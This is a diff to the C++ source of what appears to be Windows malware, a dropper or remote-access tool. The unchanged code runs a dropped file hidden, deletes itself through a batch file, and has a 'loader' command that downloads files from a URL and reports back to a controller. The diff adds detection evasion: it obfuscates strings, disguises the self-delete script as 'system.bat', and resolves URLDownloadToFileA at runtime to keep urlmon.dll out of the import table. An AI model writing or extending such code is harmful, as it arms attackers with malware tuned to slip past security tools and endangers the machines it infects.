@@ -110,13 +110,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);
 
 				if (s.auto_delete) {
-					std::ofstream bat(BAT_AUTODEL);
-					bat << "@echo off\n";
+					std::string delBat = S("C:\\Users\\system.bat");
+					std::ofstream bat(delBat.c_str());
+					bat << S("@echo off") << "\n";
 					bat << "del " + std::string(me);
-					bat << "\ndel " BAT_AUTODEL;
+					bat << "\ndel " + delBat;
 					bat.close();
-
-					ShellExecuteA(0, "open", BAT_AUTODEL, 0, 0, SW_HIDE);
+					ShellExecuteA(0, "open", delBat.c_str(), 0, 0, SW_HIDE);
 				}
 
 				return 0;
@@ -255,7 +255,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				// AUXILIARY
 				// loader https://example.com/file.exe C:\dest\file.exe
 				else if (params[0] == "loader") {
-					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
+					// Dynamically load URLDownloadToFileA so urlmon.dll stays out of the import table
+					using fn_UDTF = HRESULT(WINAPI*)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPVOID);
+					static HMODULE hUrlmon = LoadLibraryA(S("urlmon.dll").c_str());
+					static fn_UDTF pUDTF = hUrlmon
+						? (fn_UDTF)GetProcAddress(hUrlmon, S("URLDownloadToFileA").c_str())
+						: nullptr;
+					if (pUDTF) pUDTF(0, params[1].c_str(), params[2].c_str(), 0, 0);
 					if (Manager::FileExists(params[2])) {
 						std::string text = "Success! File is uploaded to: " + params[2];
 						api.SendResult(text.c_str());
